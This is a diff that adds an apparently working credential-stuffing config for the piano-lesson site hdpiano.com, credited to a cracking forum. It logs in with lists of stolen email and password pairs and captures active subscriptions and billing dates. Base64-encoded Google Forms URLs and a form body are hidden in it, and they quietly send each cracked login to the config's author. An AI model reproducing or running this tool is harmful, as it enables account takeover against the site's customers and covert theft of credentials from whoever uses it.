@@ -1,0 +1,90 @@
+[SETTINGS]
+{
+  "Name": "HDpiano @CrackingLegend.pw",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-15T09:20:10.3640294+08:00",
+  "AdditionalInfo": "@CrackingLegend.pw",
+  "Author": "@CrackingLegend.pw",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Request_HDpiano REQUEST GET "https://hdpiano.com/login/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<SOURCE>" LR "name=\"security\" value=\"" "\"" -> VAR "Security" 
+
+#Login REQUEST POST "https://hdpiano.com/wp-admin/admin-ajax.php" 
+  CONTENT "action=ajaxlogin&username=<USER>&password=<PASS>&security=<Security>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://hdpiano.com" 
+  HEADER "referer: https://hdpiano.com/" 
+
+#Cek_Login KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "loggedin\":true" 
+  KEYCHAIN Failure OR 
+    KEY "loggedin\":false" 
+
+#LRU1 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC8xOWFtQ1BvRUJGeV9zcVNPOVNQOF95U0JYQmc2TklvVk8zcnZmRm9GeDM1RS92aWV3Zm9ybQ==" -> VAR "LRU1" 
+
+#Request_Akun REQUEST GET "https://hdpiano.com/my-account/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#LRU2 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTY18zX2pZdi13NDhPaWNCblBmNVJ2Tmtla2RTWmFPSkVHMmtkWHp0Vk4zV0JkdXp3L2Zvcm1SZXNwb25zZQ==" -> VAR "LRU2" 
+
+#Nama_Pengguna PARSE "<SOURCE>" LR "Hello <strong>" "</strong>" -> CAP "Username" 
+
+#Cek_Status KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<SOURCE>" DoesNotContain "Active" 
+    KEY "Pending" 
+    KEY "Cancelled" 
+  KEYCHAIN Success OR 
+    KEY "Active" 
+
+#LRU3 FUNCTION Base64Decode "ZW50cnkuMTcwMzQwNjA1Nj1IRFBpYW5vJmVudHJ5LjEzOTUzMjQ5MT08VVNFUj46PFBBU1M+JmVudHJ5LjE4Nzg1MTYzNTI9fE5leHQgQmlsbGluZzo8TmV4dCBCaWxsaW5nPnwmZnZ2PTEmZHJhZnRSZXNwb25zZT0lNUJudWxsJTJDbnVsbCUyQyUyMjgzNzU2NDk2MTI2MTE0MDEzMDIlMjIlNUQlMEQlMEEmcGFnZUhpc3Rvcnk9MCZmYnp4PTgzNzU2NDk2MTI2MTE0MDEzMDI=" -> VAR "LRU3" 
+
+#Pembayaran_Selanjutnya PARSE "<SOURCE>" LR "data-title=\"Next Payment\">" "<br/>" -> CAP "Next Billing" "" "  Visit us @CrackingLegend.pw" 
+
+#Next_Billing REQUEST GET "<LRU1>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Username REQUEST POST "<LRU2>" 
+  CONTENT "<LRU3>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
